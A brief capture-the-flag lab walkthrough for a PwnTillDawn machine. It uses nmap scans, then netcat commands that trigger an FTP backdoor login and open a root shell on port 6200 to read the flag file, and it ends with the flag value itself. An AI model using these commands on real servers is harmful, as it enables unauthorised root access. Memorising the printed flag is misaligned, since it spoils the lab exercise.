# PwnTillDawn

## OBJECTIVE 
to compromise systems and retrieve the flag by exploiting vulnerabilities

## STEP 1
connect kali tu pwntilldawn vpn.

```
sudo openvpn PwnTillDawn.ovpn
```
once connected, an IP will appear in the top right corner showing 10.66.66.126.

## STEP 2
scan ip given from pwntilldawn in range 10.150.150.10 until 10.150.150.254

```
nmap -sn 10.150.150.10-254
```
it will help to discover active machine.

## STEP 3
from the ip listed i choose 10.150.150.12. i scan the ip with:

```
nmap -sC -sV -Pn -vv 10.150.150.12
```
findings:
* port 21 -> ftp
* port 22 -> ssh

## STEP 3
login to ftp server using netcat

```
(echo "USER hello:)"; echo "PASS password"; sleep 1) | nc -nv 10.150.150.12 21
```
this command use netcat to connect to ftp server on port 21 and automatically sends login credentials. 

## STEP 4
using ip 10.150.150.12:6200. 6200 is a port
```
(echo "id; cat /root/FLAG!.txt"; sleep 1) | nc -nv 10.150.150.12 6200
```

this command connects to a service and executes id and attempts to read the file /root/FLAG!.txt using Netcat.

## RESULT
finally get the code.
```
5ee499eb5d0b8e4269b13483e57adaa0b3815f48
```
paste it in the pwntilldawn and you're done.




